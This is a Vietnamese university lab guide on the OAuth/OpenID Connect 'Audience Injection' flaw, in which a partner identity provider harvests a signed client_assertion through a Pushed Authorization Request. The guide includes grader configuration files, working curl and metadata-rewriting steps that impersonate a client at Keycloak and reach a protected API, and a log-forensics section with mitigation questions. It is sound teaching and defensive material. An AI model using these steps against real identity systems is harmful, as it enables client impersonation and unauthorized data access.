# PHẦN 1: CƠ SỞ LÝ THUYẾT VÀ ĐIỀU KIỆN XẢY RA TẤN CÔNG AUDIENCE INJECTION

## 1. Bản chất kỹ thuật theo chuẩn IETF RFC 7523, RFC 9126 và OpenID Connect Core 1.0

Trong kiến trúc OAuth 2.0 và OpenID Connect (OIDC), khi một ứng dụng khách (Confidential Client / Relying Party — gọi tắt là `C`) giao tiếp trực tiếp ở kênh phía sau (Back-channel) với Authorization Server (`AS`), ứng dụng `C` phải xác thực danh tính của chính mình (Client Authentication).

Với phương thức **`private_key_jwt`** (**OIDC Core 1.0 §9**, **RFC 7523 §2.2 & §3**):
- Ứng dụng `C` giữ một khóa riêng bất đối xứng (Private Key) và đăng ký khóa công khai (Public Key / JWKS) tương ứng tại `AS`.
- Mỗi khi gửi yêu cầu HTTP `POST` tới các endpoint yêu cầu xác thực Client (như *Token Endpoint*, *Pushed Authorization Request - PAR Endpoint*), `C` tự tạo và ký một chuỗi JWT ngắn hạn gọi là **Client Assertion**, đính kèm qua hai tham số:
  - `client_assertion_type = urn:ietf:params:oauth:client-assertion-type:jwt-bearer`
  - `client_assertion = <Chuỗi JWT được ký bằng khóa riêng của C>`
- Chuỗi `client_assertion` xác định danh tính của ứng dụng `C` qua 5 claim bắt buộc:
  - `iss`: Chứa `client_id` của ứng dụng `C`.
  - `sub`: Chứa chính `client_id` của ứng dụng `C`.
  - `aud`: Định danh của `AS` dự kiến nhận assertion.
  - `exp`: Thời điểm hết hạn của assertion.
  - `jti`: Mã định danh duy nhất của JWT nhằm chống phát lại (replay) tại `AS`.

## 2. Nguyên nhân cốt lõi: Sự xung đột giữa RFC 7523 §3 và phần mở rộng PAR (RFC 9126)

Theo công bố của **OpenID Foundation (Security Advisory 2025-02-27; CVE-2025-27370, CVE-2025-27371)** và nghiên cứu tại **IEEE S&P 2026**, lỗ hổng **Audience Injection** xuất phát từ sự bất cập ở cấp độ đặc tả khi kết hợp **OIDC Discovery**, **`private_key_jwt` (RFC 7523)** và **Pushed Authorization Requests (PAR - RFC 9126)**:

| Thành phần giao thức | Quy định trong đặc tả gốc | Điểm gãy ranh giới tin cậy (Trust Boundary Breakdown) |
| --- | --- | --- |
| **Cách chọn `aud` (RFC 7523 §3 & OIDC Core §9)** | Cho phép (và khuyến nghị) dùng URL `token_endpoint` của Authorization Server làm giá trị cho claim `aud` trong `client_assertion`. | Các ứng dụng OIDC chuẩn luôn đọc trường `"token_endpoint"` từ bản ghi `/.well-known/openid-configuration` của IdP để điền vào claim `aud` trước khi ký `client_assertion`. |
| **Cách gửi yêu cầu PAR (RFC 9126 §2)** | Trước khi chuyển hướng người dùng, ứng dụng gửi yêu cầu `POST` kèm `client_assertion` tới địa chỉ `"pushed_authorization_request_endpoint"` trong metadata của IdP. | Khi một IdP đối tác/độc hại (`A-AS`) công bố metadata có `"token_endpoint"` trỏ sang URL của IdP nội bộ (`H-AS`), nhưng `"pushed_authorization_request_endpoint"` trỏ về máy chủ của `A-AS`, ứng dụng `C` sẽ tự động ký một `client_assertion` mang `aud` của `H-AS` rồi gửi thẳng cho `A-AS`! |
| **Cơ chế chống phát lại bằng `jti` tại `H-AS`** | `H-AS` lưu vết các mã `jti` đã nhận để từ chối nếu cùng một `client_assertion` bị gửi lại lần thứ hai. | Vì `client_assertion` mới chỉ được gửi tới `A-AS` chứ **chưa từng được gửi tới `H-AS`**, bộ nhớ `jti` tại `H-AS` hoàn toàn chưa có mã này và chấp nhận ngay ở lần sử dụng đầu tiên. |

## 3. Cấu hình chấm điểm tự động (`instr_config/`) cho 4 nhiệm vụ tuần tự

- **Tệp `instr_config/results.config`:**
```ini
# Task 1: sso_verified (Student logs into both Employee Portal and Documents Portal via SSO)
_task1_employee = server:/var/log/syslog : CONTAINS : "component": "employee", "event": "login_success", "source_ip": "172.28.50.10"
_task1_documents = server:/var/log/syslog : CONTAINS : "component": "documents", "event": "login_success"

# Task 2: assertion_harvested (Employee Portal sends PAR with injected aud to partner-idp)
_task2_par_sent = server:/var/log/syslog : CONTAINS : "par_endpoint": "http://partner-idp.lab:8080/par"
_task2_par_logged = attacker:/tmp/par.log : CONTAINS : client_assertion=

# Task 3: audience_injection_success (Attacker 172.28.50.30 authenticates via client-jwt and accesses Resource API)
_task3_kc_impersonated = server:/var/log/syslog : FILE_REGEX : type="CLIENT_LOGIN".*clientId="employee-portal".*ipAddress="172\.28\.50\.30".*client_auth_method="client-jwt"
_task3_api_compromised = server:/var/log/syslog : FILE_REGEX : "component": "api", "event": "protected_resource_access", "source_ip": "172\.28\.50\.30".*"client_id": "employee-portal"

# Task 4: forensics_done (Student correlates logs on server using journalctl)
_task4_forensics = server:.bash_history : CONTAINS : journalctl
```

- **Tệp `instr_config/goals.config`:**
```ini
sso_verified = boolean : (_task1_employee and _task1_documents)
assertion_harvested = boolean : (_task2_par_sent and _task2_par_logged)
audience_injection_success = boolean : (_task2_par_sent and _task3_kc_impersonated and _task3_api_compromised)
forensics_done = boolean : (_task3_api_compromised and _task4_forensics)
```

---

# PHẦN 2: KỊCH BẢN HƯỚNG DẪN THỰC HÀNH LAB HOÀN CHỈNH (`sso-audience-injection.md`)

**Học viện Công nghệ Bưu chính Viễn thông - SecLab PTIT**

**Hướng dẫn thực hành**

**OAuth 2.0 / OpenID Connect – Audience Injection**

**Mức độ: Trung bình – Khó**

**Web Security / Identity Security / Single Sign-On**

### 1. Giới thiệu lab

| Thông tin | Chi tiết |
| --- | --- |
| Tên Lab | sso-audience-injection |
| Mức độ | Trung bình – Khó |
| Công cụ sử dụng | firefox, curl, jq, journalctl, getent |
| Giao thức | OAuth 2.0, OpenID Connect, `private_key_jwt` (RFC 7523), PAR (RFC 9126) |
| Cơ chế bảo vệ | Strict Issuer Audience (`rfc7523bis`), Key Isolation, Cross-Service Log Correlation |

**Mục tiêu học tập**

- Hiểu rõ cơ chế xác thực ứng dụng khách bằng chữ ký số **`private_key_jwt` (RFC 7523 / OIDC Core §9)** kết hợp với **Pushed Authorization Requests – PAR (RFC 9126)**.
- Nắm vững bản chất và điều kiện xảy ra lỗ hổng **Audience Injection** (CVE-2025-27370 / CVE-2025-27371) khi ứng dụng khách tương tác với nhiều Authorization Server và lấy `token_endpoint` trong OIDC Discovery Metadata làm giá trị cho claim `aud`.
- Thực hành đầy đủ quy trình tấn công qua hai giai đoạn rõ ràng: (1) Cấu hình `token_endpoint` trên Partner IdP để dẫn dắt `aud` và thu nhận `client_assertion` qua luồng PAR; (2) Dùng `client_assertion` thu được để giả mạo ứng dụng khách trước Keycloak, lấy Access Token và truy cập trái phép vào Resource API.
- Rèn luyện kỹ năng điều tra số và tương quan nhật ký liên dịch vụ (**Cross-Service Log Correlation**) giữa `employee.service`, `keycloak.service` và `api.service` để phát hiện cuộc tấn công dựa trên khóa liên kết `token_id` / `token_jti` và địa chỉ IP xác thực Client.

**Kỹ năng đạt được**

- Phân tích cấu hình OIDC Discovery (`/.well-known/openid-configuration`) và cơ chế đẩy yêu cầu ủy quyền PAR (`POST /par`).
- Thực hiện yêu cầu xác thực Client theo chuẩn RFC 7523 (`client_assertion_type` và `client_assertion`) tại Token Endpoint để kiểm chứng lỗ hổng giả mạo ứng dụng khách.
- Sử dụng `journalctl` để truy vấn và đối chiếu chéo các sự kiện xác thực `client-jwt`, truy cập API và khởi tạo PAR nhằm chứng minh hành vi khai thác Audience Injection.

### 2. Kịch bản

**Tình huống:**

Công ty sử dụng **Keycloak (`idp.lab:8080`)** làm hệ thống xác thực tập trung SSO (Single Sign-On) cho hai ứng dụng nội bộ là **Employee Portal (`employee.lab:5001`)** và **Document Portal (`documents.lab:5002`)**, cùng dịch vụ **Resource API (`api.lab:8000`)**. Để nâng cao bảo mật, **Employee Portal** sử dụng cơ chế **Pushed Authorization Requests (PAR - RFC 9126)** kết hợp xác thực ứng dụng bằng chữ ký số **`private_key_jwt` (RFC 7523)** thay cho mật khẩu tĩnh `client_secret`, đồng thời được cấp quyền truy xuất dữ liệu từ **Resource API**.

Để phục vụ liên kết đối tác, **Employee Portal** hỗ trợ thêm tùy chọn đăng nhập qua hệ thống định danh đối tác (**Partner IdP – `partner-idp.lab:8080`**). Cả hai lựa chọn đăng nhập đều dùng chung một luồng xử lý OIDC + PAR tuân thủ RFC 7523 §3 và RFC 9126 §2: ứng dụng tải bản ghi `/.well-known/openid-configuration` của IdP được chọn, lấy giá trị trường `token_endpoint` gán vào claim `aud` để ký `client_assertion` bằng khóa riêng RSA của `employee-portal`, rồi gửi yêu cầu `POST` kèm `client_assertion` tới `pushed_authorization_request_endpoint`.

Lợi dụng việc **Employee Portal** dùng chung cặp khóa RSA và `client_id` (`employee-portal`) cho cả hai IdP, kẻ tấn công kiểm soát `partner-idp.lab` đã trỏ trường `token_endpoint` trong metadata của mình về Token Endpoint của Keycloak nội bộ (`idp.lab`). Khi một yêu cầu đăng nhập qua Partner IdP được kích hoạt, **Employee Portal** tự động ký một `client_assertion` hợp lệ mang `aud` của Keycloak và gửi thẳng tới PAR Endpoint của `partner-idp.lab`. Kẻ tấn công thu lấy `client_assertion` này để giả mạo **Employee Portal** trước Keycloak, xin cấp Access Token và truy cập trái phép vào **Resource API**.

**Vai trò của sinh viên:**

- Kiểm tra hoạt động SSO bình thường giữa **Employee Portal** và **Document Portal** thông qua Keycloak.
- Đóng vai kẻ tấn công kiểm soát `partner-idp.lab` (`attacker`), cấu hình OIDC Discovery Metadata để tiêm `aud` của Keycloak và thu nhận `client_assertion` tại PAR Endpoint.
- Sử dụng `client_assertion` thu được để giả mạo `employee-portal` tại Token Endpoint của Keycloak, lấy Access Token và truy cập **Resource API**.
- Đóng vai chuyên gia Blue Team / điều tra số, sử dụng `journalctl` trên `server` để tương quan nhật ký giữa **Employee Portal**, **Keycloak** và **Resource API**, truy vết khóa liên kết `token_id` / `token_jti` và sự bất đồng nhất về địa chỉ IP nhằm chứng minh cuộc tấn công Audience Injection.

**Sơ đồ luồng hoạt động của bài lab**

```mermaid
sequenceDiagram
    autonumber
    participant A as Attacker / Partner IdP (172.28.50.30)
    participant C as Employee Portal (172.28.50.20:5001)
    participant K as Keycloak / H-AS (172.28.50.20:8080)
    participant R as Resource API (172.28.50.20:8000)

    Note over A,C: Nhiệm vụ 2: Dẫn dắt Metadata & Thu nhận Client Assertion qua PAR
    A->>C: Kích hoạt đăng nhập qua Partner IdP (/login?idp=partner)
    C->>A: GET /.well-known/openid-configuration
    A-->>C: Metadata: token_endpoint = K/token, par_endpoint = A/par
    C->>A: POST /par (đính kèm client_assertion do C ký với aud = K/token)

    Note over A,R: Nhiệm vụ 3: Giả mạo Client trước Keycloak & Khai thác Resource API
    A->>K: POST /token (grant_type=client_credentials + client_assertion thu được)
    K-->>A: 200 OK (Access Token của employee-portal)
    A->>R: GET /api/protected (Authorization: Bearer <Access Token>)
    R-->>A: 200 OK (Trả về dữ liệu bảo vệ)
```

**Mô tả luồng tấn công**

- Kẻ tấn công cấu hình dịch vụ OIDC Discovery trên `partner-idp.lab` sao cho trường `token_endpoint` trỏ về URL Token Endpoint của Keycloak (`idp.lab`), trong khi `pushed_authorization_request_endpoint` trỏ về `/par` của `partner-idp.lab`.
- Khi luồng đăng nhập qua Partner IdP trên **Employee Portal** được kích hoạt, **Employee Portal** tải metadata từ `partner-idp.lab`, tạo `client_assertion` có `iss = sub = "employee-portal"` và `aud` bằng `token_endpoint` của Keycloak, ký bằng khóa riêng RSA rồi gửi tới `/par` của `partner-idp.lab`.
- Kẻ tấn công lấy `client_assertion` vừa nhận được gửi lên Token Endpoint của Keycloak. Vì chữ ký RSA, `iss`, `sub`, `aud`, `exp` và `jti` đều hợp lệ, Keycloak xác nhận kẻ tấn công là `employee-portal` và cấp Access Token.
- Kẻ tấn công dùng Access Token đó gọi vào `/api/protected` của **Resource API** và chiếm quyền truy cập tài nguyên.

### 3. Kiến thức bổ trợ

**Kiến trúc hệ thống SSO trong Lab**

Lab gồm ba container:

| Thành phần | Container | Địa chỉ IP | Vai trò |
| --- | --- | --- | --- |
| Firefox + curl | client | 172.28.50.10 | Máy người dùng nội bộ (`student`) |
| Partner IdP (`partner-idp.service`) + curl | attacker | 172.28.50.30 (`partner-idp.lab`) | Máy kẻ tấn công vận hành IdP đối tác (`A-AS`) |
| Keycloak + Portals + API | server | 172.28.50.20 | Máy chủ vận hành Keycloak (`H-AS`), hai Portal và Resource API |

Các dịch vụ chạy trong hệ thống:

| Dịch vụ | Địa chỉ truy cập | Mô tả |
| --- | --- | --- |
| Keycloak (IdP nội bộ) | `http://idp.lab:8080` | Máy chủ định danh nội bộ (`H-AS`), hỗ trợ PAR và `private_key_jwt` |
| Employee Portal | `http://employee.lab:5001` | Ứng dụng hỗ trợ đăng nhập đa IdP qua PAR + `private_key_jwt` |
| Document Portal | `http://documents.lab:5002` | Ứng dụng nội bộ dùng chung phiên SSO với Employee Portal |
| Resource API | `http://api.lab:8000/api/protected` | API bảo vệ bằng Access Token |
| Partner IdP (IdP đối tác) | `http://partner-idp.lab:8080` | Dịch vụ OIDC Discovery & PAR Endpoint chạy trên máy `attacker` (`A-AS`) |

**Cơ chế `private_key_jwt` (RFC 7523) kết hợp PAR (RFC 9126)**

Thay vì truyền các tham số đăng nhập trên URL trình duyệt (Front-channel), **Pushed Authorization Requests (PAR - RFC 9126)** yêu cầu backend của ứng dụng khách gửi trước toàn bộ tham số ủy quyền cùng với bằng chứng xác thực ứng dụng (`client_assertion` theo chuẩn `private_key_jwt`) qua kênh Back-channel tới `pushed_authorization_request_endpoint` của IdP.

**Nguyên lý lỗ hổng Audience Injection**

Khi ứng dụng khách tuân thủ RFC 7523 §3 (lấy `token_endpoint` trong metadata của IdP để gán vào claim `aud` của `client_assertion`) và dùng chung cặp khóa RSA cho nhiều IdP:
- Bản thân `client_assertion` được gửi tới `pushed_authorization_request_endpoint` (thuộc về `partner-idp.lab`).
- Nhưng giá trị `aud` được ký bên trong `client_assertion` lại lấy từ `token_endpoint` (đã bị `partner-idp.lab` trỏ về `idp.lab`).
- Do đó, `partner-idp.lab` thu được một `client_assertion` có chữ ký thật của `employee-portal`, mang đúng `aud` của `idp.lab` và có mã `jti` hoàn toàn mới đối với `idp.lab`.

**Các cơ chế bảo vệ và phát hiện quan trọng**

- **Chuẩn hóa Audience theo `draft-ietf-oauth-rfc7523bis`:** Bắt buộc claim `aud` trong `client_assertion` chỉ chứa duy nhất định danh `issuer` của Authorization Server (không dùng URL của `token_endpoint`), kết hợp kiểm tra khớp `issuer` trước khi gửi yêu cầu PAR.
- **Cô lập khóa ký (Cryptographic Key Isolation):** Mỗi IdP liên kết phải sử dụng một cặp khóa bất đối xứng và `client_id` riêng biệt.
- **Cross-Service Log Correlation (Tương quan nhật ký liên dịch vụ):**
  - Mọi yêu cầu xác thực `client-jwt` hợp lệ của `employee-portal` tại Keycloak đều xuất phát từ IP của máy chủ `server` (`172.28.50.20`).
  - Khi bị khai thác Audience Injection, nhật ký `keycloak.service` xuất hiện sự kiện `CLIENT_LOGIN` của `employee-portal` bằng `client-jwt` từ IP `172.28.50.30` (máy `attacker`), cấp ra token có `token_id` trùng với `token_jti` truy cập vào `api.service` từ `172.28.50.30`, ngay sau khi `employee.service` gửi yêu cầu PAR tới `http://partner-idp.lab:8080/par`.

**Bảng tùy chọn và cú pháp công cụ sử dụng trong bài**

| Công cụ | Tùy chọn / Cú pháp | Mô tả tác dụng |
| --- | --- | --- |
| `firefox` | `firefox >/dev/null 2>&1 &` | Trình duyệt thực hiện đăng nhập kiểm tra SSO |
| `curl` | `curl -sS -X POST <url> -d ...` | Kích hoạt luồng PAR, gửi `client_assertion` lấy Token và gọi Resource API |
| `journalctl` | `sudo journalctl -u <service> --since "<time>"` | Xem và đối chiếu nhật ký của `employee`, `keycloak`, `api` |
| `getent` | `getent hosts <hostname>` | Kiểm tra phân giải tên miền hệ thống |

---

### 4. Các nhiệm vụ của bài thực hành

Để tải bài thực hành, sinh viên thực hiện câu lệnh:

```bash
imodule https://github.com/huytrung8924/sso/raw/refs/heads/main/sso-audience-injection.tar
```

Để khởi động bài thực hành, sinh viên dùng câu lệnh:

```bash
labtainer sso-audience-injection
```

*(Chú ý: sinh viên sử dụng mã sinh viên của mình để nhập thông tin email người thực hiện bài lab khi có yêu cầu, để sử dụng khi chấm điểm)*

Sau khi khởi động xong, ba terminal ảo sẽ xuất hiện tương ứng với 3 máy: `client`, `attacker` và `server`.

**Tài khoản thực hành**

- Tài khoản Người dùng nội bộ: `student` / `Student-2026!`

---

**Nhiệm vụ 1 – `sso_verified`: Kiểm tra môi trường và tính năng SSO**

Trước khi bắt đầu thí nghiệm, cần đảm bảo hệ thống đã sẵn sàng và luồng đăng nhập Single Sign-On sử dụng PAR + `private_key_jwt` với Keycloak nội bộ (`idp.lab`) hoạt động đúng.

**Bước 1:** Tại cửa sổ terminal `client` và `attacker`, kiểm tra phân giải tên miền:

```bash
getent hosts idp.lab employee.lab documents.lab api.lab partner-idp.lab
```

Kết quả đúng: `idp.lab`, `employee.lab`, `documents.lab`, `api.lab` trỏ về `172.28.50.20`; `partner-idp.lab` trỏ về `172.28.50.30`.

**Bước 2:** Tại terminal `client`, mở trình duyệt Firefox:

```bash
firefox >/dev/null 2>&1 &
```

**Bước 3:** Trên Firefox của `client`, truy cập `http://employee.lab:5001`, nhấn **Đăng nhập nội bộ** với tài khoản:

```text
student / Student-2026!
```

Xác nhận màn hình hiển thị **Xin chào, Sinh viên SSO** (`student`).

**Bước 4:** Tiếp tục truy cập `http://documents.lab:5002` ngay trên Firefox đó và nhấn **Đăng nhập**. Trình duyệt sẽ vào thẳng trang tài liệu mà không yêu cầu nhập lại mật khẩu.

**Điều kiện hoàn thành nhiệm vụ:** Tên miền phân giải đúng và đăng nhập SSO thành công trên cả Employee Portal lẫn Document Portal.

**Câu hỏi 1:**

Trong luồng đăng nhập vừa thực hiện, việc trình duyệt của người dùng xác thực với Keycloak khác gì với việc máy chủ Employee Portal xác thực ứng dụng (`Client Authentication` bằng `private_key_jwt`) với Keycloak?

**Trả lời:** _______________________________________

---

**Nhiệm vụ 2 – `assertion_harvested`: Cấu hình Audience Injection trên Partner IdP và Thu thập `client_assertion`**

Sinh viên đóng vai kẻ tấn công kiểm soát máy chủ `partner-idp.lab` (`172.28.50.30`), thực hiện chỉnh sửa bản ghi OIDC Discovery Metadata để tiêm `aud` của Keycloak nội bộ vào `client_assertion` của Employee Portal, sau đó kích hoạt luồng đăng nhập qua Partner IdP để thu nhận `client_assertion` tại PAR Endpoint.

**Bước 1:** Tại terminal `attacker` (`172.28.50.30`), cập nhật tệp cấu hình OIDC Discovery `/etc/partner-idp/openid-configuration.json` sao cho trường `token_endpoint` trỏ sang Token Endpoint của Keycloak (`idp.lab`), còn `pushed_authorization_request_endpoint` giữ nguyên tại `partner-idp.lab`:

```bash
sudo tee /etc/partner-idp/openid-configuration.json >/dev/null <<'EOF'
{
  "issuer": "http://partner-idp.lab:8080",
  "authorization_endpoint": "http://partner-idp.lab:8080/auth",
  "token_endpoint": "http://idp.lab:8080/realms/sso-lab/protocol/openid-connect/token",
  "pushed_authorization_request_endpoint": "http://partner-idp.lab:8080/par",
  "jwks_uri": "http://partner-idp.lab:8080/certs",
  "response_types_supported": ["code"],
  "subject_types_supported": ["public"],
  "id_token_signing_alg_values_supported": ["RS256"],
  "token_endpoint_auth_methods_supported": ["private_key_jwt"]
}
EOF
```

**Bước 2:** Kích hoạt luồng đăng nhập qua Partner IdP trên Employee Portal (bằng cách nhấn nút **Đăng nhập qua Partner IdP** trên giao diện `http://employee.lab:5001` hoặc gọi yêu cầu tới `/login?idp=partner`), sau đó đọc tệp `/tmp/par.log` trên máy `attacker` để lấy chuỗi `client_assertion` mà Employee Portal vừa ký và gửi sang `/par`:

```bash
curl -sS -o /dev/null http://employee.lab:5001/login?idp=partner
cat /tmp/par.log
```

Quan sát: Tệp `/tmp/par.log` ghi nhận yêu cầu `POST /par` từ `172.28.50.20` chứa tham số `client_assertion=<Chuỗi_JWT>`. Sao chép chuỗi JWT này để sử dụng ở Nhiệm vụ 3.

**Điều kiện hoàn thành nhiệm vụ:** Đã cấu hình metadata trên `partner-idp.lab`, kích hoạt luồng PAR và thu nhận được `client_assertion` trong `/tmp/par.log`.

**Câu hỏi 2:**

Vì sao Employee Portal tuân thủ đúng quy tắc lấy `aud = token_endpoint` (RFC 7523 §3) và gửi yêu cầu tới `pushed_authorization_request_endpoint` (RFC 9126 §2) nhưng lại làm lộ `client_assertion` hợp lệ của `idp.lab` cho `partner-idp.lab`?

**Trả lời:** _______________________________________

---

**Nhiệm vụ 3 – `audience_injection_success`: Giả mạo Client tại Keycloak và Chiếm quyền truy cập Resource API**

Khi đã có trong tay chuỗi `client_assertion` do chính Employee Portal ký với `aud` là Token Endpoint của Keycloak, kẻ tấn công gửi trực tiếp `client_assertion` này lên Keycloak để xác thực dưới danh tính `employee-portal`, xin cấp Access Token và truy cập Resource API.

**Bước 1:** Tại terminal `attacker`, gửi chuỗi `client_assertion` vừa thu được ở Nhiệm vụ 2 lên Token Endpoint của Keycloak (`idp.lab`) theo chuẩn RFC 7523 để nhận `access_token`:

```bash
curl -sS -X POST http://idp.lab:8080/realms/sso-lab/protocol/openid-connect/token \
  -d 'grant_type=client_credentials' \
  -d 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' \
  --data-urlencode 'client_assertion=<DÁN_CLIENT_ASSERTION_VÀO_ĐÂY>' | jq .
```

Quan sát: Keycloak chấp nhận chữ ký số và các claim (`iss`, `sub`, `aud`, `jti`) của `client_assertion`, trả về phản hồi JSON chứa `access_token` cấp cho `employee-portal`. Sao chép giá trị `access_token` này.

**Bước 2:** Sử dụng `access_token` vừa nhận được để gọi vào điểm cuối bảo vệ của Resource API:

```bash
curl -sS -i http://api.lab:8000/api/protected \
  -H 'Authorization: Bearer <DÁN_ACCESS_TOKEN_VÀO_ĐÂY>'
```

Quan sát kết quả: Resource API trả về **`HTTP/1.1 200 OK`** kèm dữ liệu `{"status": "ok"}`.

**Điều kiện hoàn thành nhiệm vụ:** Giả mạo thành công `employee-portal` tại Keycloak bằng `client_assertion` thu được và gọi Resource API nhận phản hồi `200 OK`.

**Câu hỏi 3:**

Keycloak có cơ chế chống phát lại (Replay Protection) dựa trên việc lưu vết mã định danh `jti` của mỗi `client_assertion`. Vì sao cơ chế này không chặn được hành vi gửi `client_assertion` ở Bước 1, nhưng nếu bạn chạy lại đúng lệnh `curl` ở Bước 1 lần thứ hai với cùng `client_assertion` đó thì Keycloak sẽ từ chối?

**Trả lời:** _______________________________________

---

**Nhiệm vụ 4 – `forensics_done`: Phát hiện và truy vết tấn công Audience Injection qua Tương quan Nhật ký**

Đóng vai chuyên gia Blue Team / SOC. Hệ thống giám sát phát hiện có truy cập trái phép vào Resource API dưới danh tính của ứng dụng `employee-portal`. Nhiệm vụ của bạn là sử dụng kỹ thuật **Cross-Service Log Correlation** giữa `api.service`, `keycloak.service` và `employee.service` trên máy chủ `server` để chứng minh đây là tấn công **Audience Injection** chứ không phải do máy chủ bị đánh cắp tệp khóa riêng RSA.

**Bước 1:** Tại cửa sổ terminal `server`, kiểm tra nhật ký truy cập trên `api.service` và nhật ký khởi tạo PAR trên `employee.service`:

```bash
sudo journalctl -u employee.service -u api.service --since "15 minutes ago" --no-pager -o cat | grep -E "par_request_sent|protected_resource_access"
```

Quan sát các bản ghi JSON trả về:
- Tại `api.service` (`protected_resource_access`): Lượt truy cập hợp lệ ở Nhiệm vụ 1 xuất phát từ `"source_ip": "172.28.50.20"` (máy chủ chạy Employee Portal). Ngược lại, lượt truy cập bất thường mang `"client_id": "employee-portal"`, `"username": "service-account-employee-portal"` lại xuất phát từ **`"source_ip": "172.28.50.30"`** (máy `attacker`). Ghi nhận giá trị trường **`"token_jti"`** của lượt truy cập này.
- Tại `employee.service` (`par_request_sent`): Ngay trước thời điểm xảy ra truy cập trái phép, Employee Portal đã gửi một yêu cầu PAR kèm `client_assertion` tới `"par_endpoint": "http://partner-idp.lab:8080/par"` (địa chỉ `172.28.50.30`).

**Bước 2:** Đối chiếu mã `token_jti` vừa ghi nhận với nhật ký xác thực ứng dụng bằng chữ ký số (`client-jwt`) trên `keycloak.service`:

```bash
sudo journalctl -u keycloak.service --since "15 minutes ago" --no-pager -o cat | grep 'client_auth_method="client-jwt"'
```

Đối chiếu kết quả trên `keycloak.service`:
- Ở Nhiệm vụ 1, sự kiện `type="CODE_TO_TOKEN"` của `clientId="employee-portal"` với `client_auth_method="client-jwt"` xuất phát từ **`ipAddress="172.28.50.20"`**.
- Ở thời điểm bị tấn công, xuất hiện sự kiện `type="CLIENT_LOGIN"` của `clientId="employee-portal"` với `client_auth_method="client-jwt"` nhưng **`ipAddress="172.28.50.30"`**, và trường **`token_id`** trùng khớp hoàn toàn với **`token_jti`** đã truy cập vào Resource API ở Bước 1!

**Điều kiện hoàn thành nhiệm vụ:** Đã truy vấn và đối chiếu chéo trường `token_id` / `token_jti` cùng sự dịch chuyển địa chỉ IP (`172.28.50.20` sang `172.28.50.30`) giữa `employee.service`, `keycloak.service` và `api.service`.

**Câu hỏi 4:**

Khi phát hiện sự kiện `clientId="employee-portal"` xác thực bằng `client_auth_method="client-jwt"` từ địa chỉ IP `172.28.50.30` trên Keycloak, làm thế nào để kết hợp nhật ký của `employee.service` (`par_request_sent` tới `partner-idp.lab`) và cấu hình metadata của `partner-idp.lab` nhằm chứng minh đây là tấn công **Audience Injection** chứ không phải trường hợp kẻ tấn công đánh cắp tệp khóa riêng RSA từ máy chủ `server`?

**Trả lời:** _______________________________________

**Câu hỏi 5:**

Theo dự thảo cập nhật bảo mật **`draft-ietf-oauth-rfc7523bis`**, cần thay đổi quy tắc tạo và kiểm tra claim `aud` trong `client_assertion` như thế nào ở cả phía **Employee Portal** và **Keycloak** để triệt tiêu hoàn toàn lỗ hổng Audience Injection?

**Trả lời:** _______________________________________

**Học viện Công nghệ Bưu chính Viễn thông - SecLab PTIT**
